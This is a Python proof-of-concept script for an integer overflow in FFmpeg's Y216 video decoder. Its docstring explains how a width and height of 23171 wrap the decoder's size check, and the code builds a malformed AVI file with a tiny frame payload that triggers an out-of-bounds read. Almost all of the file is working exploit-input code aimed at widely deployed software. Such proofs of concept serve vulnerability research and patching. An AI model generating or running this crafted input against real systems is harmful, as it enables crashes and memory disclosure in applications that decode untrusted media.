#!/usr/bin/env python3
"""
PoC generator for vuln_001: Integer overflow → OOB Read in y216_decode_frame()
(FFmpeg libavcodec/targa_y216dec.c, lines 39-66)

Craft a minimal AVI with TARGA_Y216 codec (fourcc "Y216"), width=height=23171,
and a tiny (~1024-byte) video data payload. The size check at line 42:
    if (avpkt->size < 4 * avctx->height * aligned_width)
overflows signed 32-bit int when width≈height≈23171, aligned_width=23172,
because 4 * 23171 * 23172 = 2,147,673,648 > INT_MAX (2,147,483,647), so the
product wraps to a large negative number, making the guard always false for any
non-negative avpkt->size.  The decoder then reads src[4*j]…src[4*j+3] far
past the end of the actual packet buffer → OOB read.
"""

import struct
import os

OUT = "vuln_001_input.avi"

WIDTH  = 23171
HEIGHT = 23171
FOURCC = b"Y216"       # TARGA_Y216 fourcc confirmed in libavformat/isom_tags.c

# Tiny video payload – much smaller than the 4*HEIGHT*WIDTH the decoder expects
FRAME_DATA = b"\x00" * 1024

# ---- helper ------------------------------------------------------------------

def fourcc(s):
    return s if isinstance(s, bytes) else s.encode("ascii")

def chunk(tag, data):
    """Pack a RIFF chunk: tag(4) + size(4 LE) + data (padded to even)."""
    assert len(tag) == 4
    payload = data
    if len(payload) % 2:
        payload += b"\x00"
    return tag + struct.pack("<I", len(data)) + payload

def list_chunk(list_type, *children):
    """Pack a LIST chunk: 'LIST' + size + list_type + children."""
    body = list_type + b"".join(children)
    return b"LIST" + struct.pack("<I", len(body)) + body

# ---- avih (main AVI header, 56 bytes) ----------------------------------------

def make_avih():
    micro_per_frame   = 33333          # ~30 fps
    max_bytes_per_sec = 0
    padding           = 0
    flags             = 0x10           # AVIF_HASINDEX (optional but conventional)
    total_frames      = 1
    initial_frames    = 0
    streams           = 1
    suggested_buf_sz  = len(FRAME_DATA)
    width             = WIDTH
    height            = HEIGHT
    reserved          = b"\x00" * 16

    body = struct.pack("<IIIIIIIIII",
        micro_per_frame, max_bytes_per_sec, padding, flags,
        total_frames, initial_frames, streams, suggested_buf_sz,
        width, height) + reserved
    return chunk(b"avih", body)

# ---- strh (stream header, 56 bytes) ------------------------------------------

def make_strh():
    fcc_type           = b"vids"
    fcc_handler        = FOURCC        # "Y216"
    flags              = 0
    priority           = 0
    language           = 0
    initial_frames     = 0
    scale              = 1
    rate               = 30
    start              = 0
    length             = 1             # 1 frame
    suggested_buf_sz   = len(FRAME_DATA)
    quality            = -1  # 0xFFFFFFFF as signed int
    sample_size        = 0
    frame_rect         = struct.pack("<hhhh", 0, 0, WIDTH, HEIGHT)

    body = (fcc_type + fcc_handler +
            struct.pack("<IHHIIIIIIiI",
                flags, priority, language, initial_frames,
                scale, rate, start, length,
                suggested_buf_sz, quality, sample_size) +
            frame_rect)
    return chunk(b"strh", body)

# ---- strf (BITMAPINFOHEADER, 40 bytes) ----------------------------------------

def make_strf():
    bi_size          = 40
    bi_width         = WIDTH
    bi_height        = HEIGHT
    bi_planes        = 1
    bi_bit_count     = 16
    bi_compression   = FOURCC          # "Y216"
    bi_size_image    = len(FRAME_DATA)
    bi_x_pels        = 0
    bi_y_pels        = 0
    bi_clr_used      = 0
    bi_clr_important = 0

    body = struct.pack("<IiiHH4sIIIII",
        bi_size, bi_width, bi_height, bi_planes, bi_bit_count,
        bi_compression, bi_size_image,
        bi_x_pels, bi_y_pels, bi_clr_used, bi_clr_important)
    return chunk(b"strf", body)

# ---- strl LIST ----------------------------------------------------------------

def make_strl():
    return list_chunk(b"strl", make_strh(), make_strf())

# ---- hdrl LIST ----------------------------------------------------------------

def make_hdrl():
    return list_chunk(b"hdrl", make_avih(), make_strl())

# ---- movi LIST ----------------------------------------------------------------

def make_movi():
    video_chunk = chunk(b"00dc", FRAME_DATA)
    return list_chunk(b"movi", video_chunk)

# ---- assemble RIFF AVI --------------------------------------------------------

def build_avi():
    hdrl = make_hdrl()
    movi = make_movi()
    avi_body = hdrl + movi
    riff_body = b"AVI " + avi_body
    return b"RIFF" + struct.pack("<I", len(riff_body)) + riff_body

# ---- write -------------------------------------------------------------------

avi_bytes = build_avi()
out_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), OUT)
with open(out_path, "wb") as f:
    f.write(avi_bytes)

print(f"[+] Written {len(avi_bytes)} bytes to {out_path}")
print(f"    WIDTH={WIDTH}  HEIGHT={HEIGHT}  FOURCC={FOURCC}")
print(f"    FRAME_DATA size={len(FRAME_DATA)} bytes  (tiny – triggers overflow guard bypass)")
